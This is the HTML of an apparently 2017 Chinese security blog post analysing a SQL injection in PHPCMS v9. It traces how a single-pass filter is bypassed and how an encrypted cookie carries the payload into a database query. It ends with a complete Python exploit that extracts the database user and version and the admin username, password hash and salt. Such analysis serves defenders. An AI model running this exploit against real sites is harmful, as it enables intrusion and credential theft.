@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://jenihk.github.io/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://jenihk.github.io/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://jenihk.github.io/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://jenihk.github.io/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://jenihk.github.io/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://jenihk.github.io/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+        <meta name="tags" contents="SQL-injection" />
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://jenihk.github.io/security/phpcmsv9.html">
+	<meta property="og:title" content="PHPCMSv9 SQL 注入漏洞分析">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://jenihk.github.io/../theme/images/posts/phpcms/phpcms-cover.png">
+	<meta property="article:published_time" content="2017-04-10 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://jenihk.github.io/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://jenihk.github.io/category/an-quan.html">安全</a></li>
+                        <li><a href="https://jenihk.github.io/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://jenihk.github.io/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('../theme/images/posts/phpcms/phpcms-cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>PHPCMSv9 SQL 注入漏洞分析</h1>
+                        <span class="meta">Posted by
+                                <a href="https://jenihk.github.io/author/jeni.html">JenI</a>
+                             on 2017-04-10 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>PHPCMS V9（后面简称V9）采用 PHP5+MYSQL 做为技术基础进行开发。V9 采用 OOP（面向对象编程）+ MVC 设计模式,进行基础运行框架搭建。近两天，V9 被爆出存在 SQL 注入，据说这个漏洞从去年年底开始就被黑产界利用，直到最近才公布出来，网上给出了 POC ，直接看脚本也看不出什么，于是下了套源码结合着 POC 做了个简单的分析。</p>
+<p><strong><em>漏洞复现</em></strong></p>
+<p>根据网上给出的poc，验证结果如下：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/phpcms/phpcms-1.png" alt="phpcms-1" /></div>
+
+<p>可以看到通过注入成功获得了数据库的相关信息和数据库内数据。</p>
+<p><strong><em>漏洞分析</em></strong></p>
+<p>通过查看 poc 源码可以发现，注入点出现在 /index.php?m=content&amp;c=down&amp;a_k= 页面，但是在此之前，脚本曾多次请求 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id= 页面，所以初步推断问题应该与 /phpcms/modules/attachment 目录下的 attachments.php 文件内的 swfupload_json 函数有关。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/phpcms/phpcms-2.png" alt="phpcms-2" /></div>
+
+<p>通过源码可知，swfupload_json() 函数首先以 get 方式接收传入的参数，将 aid、src、filename 等参数经 json 编码后设置为 cookie 的值，而 cookie 的键则为 system.php 文件中 cookie_pre 与 json_str 拼接后的内容。键值对经 set_cookie() 函数编码后作为 cookie 的值。其中关键的地点在 $arr['src'] = safe_replace(trim($_GET['src'])); 一句，这里使用 safe_replace 函数对 src 参数传入内容进行处理，我们看下 safe_replace 函数的定义。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/phpcms/phpcms-3.png" alt="phpcms-3" /></div>
+
+<p>可以看到 safe_replace 函数对字符串中的特殊字符进行了替换删除操作，但是由于该函数只执行了一次，所以只需对 payload 进行适当的改变就可以绕过过滤，举例来说，假设，我们传入的 payload 为 %27and%20，经过 safe_replace 函数处理后，传入数据库的内容为 and%20，%27 被删除了，但假如我们将 payload 改写为% *27an<em>d%20，经 safe_replace 函数处理一次后，删除了其中的</em>，传入数据库的内容就变为了 %27and%20，这样就绕过了安全函数的过滤。
+到这里我们成功让 payload 绕过过滤，cookie 值成功传入到 set_cookie 函数中，下面为 set_cookie 函数定义:</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/phpcms/phpcms-4.png" alt="phpcms-4" /></div>
+
+<p>可以看到函数内部对传入数组的操作，其中调用了 sys_auth 函数，并且传入 ENCODE 加密参数，实现了对 cookie 的加密，这里之所以要进行加密，是因为之后访问的 /index.php?m=content&amp;c=down&amp;a_k= 页面中 a_k 参数内容会通过 sys_auth 函数解密一次，但由于 system.php 中 auth_key 的值是未知的，所以我们无法直接本地对 cookie 加密，只能通过 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id= 页面将我们的 payload 传入服务器，再将返回的 cookie 作为加密后的 payload 传入 /index.php?m=content&amp;c=down&amp;a_k= 页面，交由 down.php 页面进行解密，解密后的参数未经校验便传入数据库，因此造成注入，这也是 poc 中每次执行 sql 语句时，都需要先 将 payload 传入服务器加密的原因。下面是 down.php 中 init 函数的定义:</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/phpcms/phpcms-5.png" alt="phpcms-5" /></div>
+
+<p>down.php 页面通过 get 方式获取 ’a_k’ 的值，也就是我们传入的经 auth_key 加密后的 payload，然后调用 auth_key 进行解密操作，解密后使用 parse_str 函数将解密后的字符串解析为变量并解码。最后在 $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id));一句作为 $id 被传入数据库，从而导致 sql 语句执行。</p>
+<p><strong><em>漏洞POC</em></strong></p>
+<div class="highlight"><pre><span></span><span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">sqli_prefix</span> <span class="o">=</span> <span class="s1">&#39;%*27an*d%20&#39;</span>
+    <span class="n">sqli_info</span> <span class="o">=</span> <span class="s1">&#39;e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x6c75616e24,us*er(),0x3a,ver*sion(),0x6c75616e24))x))&#39;</span>
+    <span class="n">sqli_password1</span> <span class="o">=</span> <span class="s1">&#39;e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x6c75616e24,username,0x3a,password,0x3a,encrypt,0x6c75616e24) fr*om &#39;</span>
+    <span class="n">sqli_password2</span> <span class="o">=</span> <span class="s1">&#39;_admin li*mit 0,1)x))&#39;</span>
+    <span class="n">sqli_padding</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%23%</span><span class="s1">26m%3D1</span><span class="si">%26f</span><span class="s1">%3Dwobushou%26modelid%3D2</span><span class="si">%26c</span><span class="s1">atid%3D6&#39;</span>
+    <span class="n">setp1</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php?m=wap&amp;a=index&amp;siteid=1&#39;</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">sqli_payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">setp1</span><span class="p">)</span><span class="o">.</span><span class="n">cookies</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">name</span><span class="p">[</span><span class="o">-</span><span class="mi">7</span><span class="p">:]</span> <span class="o">==</span> <span class="s1">&#39;_siteid&#39;</span><span class="p">:</span>
+                <span class="n">cookie_head</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">name</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
+                <span class="n">cookies</span><span class="p">[</span><span class="n">cookie_head</span><span class="o">+</span><span class="s1">&#39;_userid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">value</span>
+            <span class="n">cookies</span><span class="p">[</span><span class="n">c</span><span class="o">.</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">value</span>
+        <span class="n">setp2</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=</span><span class="si">%26i</span><span class="s1">d=&#39;</span> <span class="o">+</span> <span class="n">sqli_prefix</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">sqli_info</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;qwertyuiopasdfghjklzxcvbnm*&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">sqli_padding</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">setp2</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">cookies</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">name</span><span class="p">[</span><span class="o">-</span><span class="mi">9</span><span class="p">:]</span> <span class="o">==</span> <span class="s1">&#39;_att_json&#39;</span><span class="p">:</span>
+                <span class="n">sqli_payload</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">value</span>
+        <span class="n">setp3</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php?m=content&amp;c=down&amp;a_k=&#39;</span> <span class="o">+</span> <span class="n">sqli_payload</span>
+        <span class="n">html</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">setp3</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;luan$&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">table_prefix</span> <span class="o">=</span> <span class="n">html</span><span class="p">[</span><span class="n">html</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;_download_data&#39;</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span><span class="n">html</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;_download_data&#39;</span><span class="p">)]</span>
+                <span class="n">setp22</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=</span><span class="si">%26i</span><span class="s1">d=&#39;</span> <span class="o">+</span> <span class="n">sqli_prefix</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">sqli_password1</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;qwertyuiopasdfghjklzxcvbnm*&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">table_prefix</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">sqli_password2</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;qwertyuiopasdfghjklzxcvbnm*&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">sqli_padding</span>
+                <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">setp22</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">cookies</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">name</span><span class="p">[</span><span class="o">-</span><span class="mi">9</span><span class="p">:]</span> <span class="o">==</span> <span class="s1">&#39;_att_json&#39;</span><span class="p">:</span>
+                        <span class="n">sqli_payload</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">value</span>
+                <span class="n">setp33</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php?m=content&amp;c=down&amp;a_k=&#39;</span> <span class="o">+</span> <span class="n">sqli_payload</span>
+                <span class="n">html2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">setp33</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+                <span class="k">print</span> <span class="s1">&#39;[+]admin:password:salt ==&gt; &#39;</span> <span class="o">+</span> <span class="n">html2</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;luan$&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">except</span> <span class="ne">IndexError</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s1">&#39;[+]webuser ==&gt; &#39;</span> <span class="o">+</span> <span class="n">html</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;luan$&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s1">&#39;list index out of range&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
+            <span class="k">print</span> <span class="s1">&#39;[-]It looks not vulnerable&#39;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s2">&quot;[-]Error:  &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s1">&#39;:443&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="s1">&#39;8443&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">check</span><span class="p">(</span><span class="s1">&#39;https://&#39;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">check</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s1">&#39;Usage : run.py ip:port(default 80)&#39;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+        <hr />
+        <p>作者:JenI&#160; &#160; &#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/phpcmsv9.html';
+                var disqus_url = 'https://jenihk.github.io/security/phpcmsv9.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://jenihk.github.io/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://jenihk.github.io/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://jenihk.github.io/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://jenihk.github.io/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
